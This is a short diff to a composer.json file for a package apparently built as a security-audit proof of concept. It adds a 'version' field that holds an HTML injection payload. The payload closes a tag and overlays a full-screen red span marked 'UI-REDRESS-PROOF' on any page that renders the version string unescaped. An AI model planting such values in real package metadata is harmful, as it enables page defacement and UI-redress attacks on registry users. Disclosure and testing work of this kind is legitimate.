@@ -1,8 +1,9 @@
 {
     "name": "leduckhuong/packagist-audit-poc",
-    "description": "Security audit PoC package - UI redress demo",
+    "description": "Security audit PoC package - update log span injection demo",
     "license": "MIT",
     "type": "library",
+    "version": "dev-x</><span style=\"position:fixed;top:0;left:0;width:100vw;height:100vh;background:#d9534f;z-index:99999\">UI-REDRESS-PROOF</span>",
     "require": {
         "php": ">=8.1"
     }
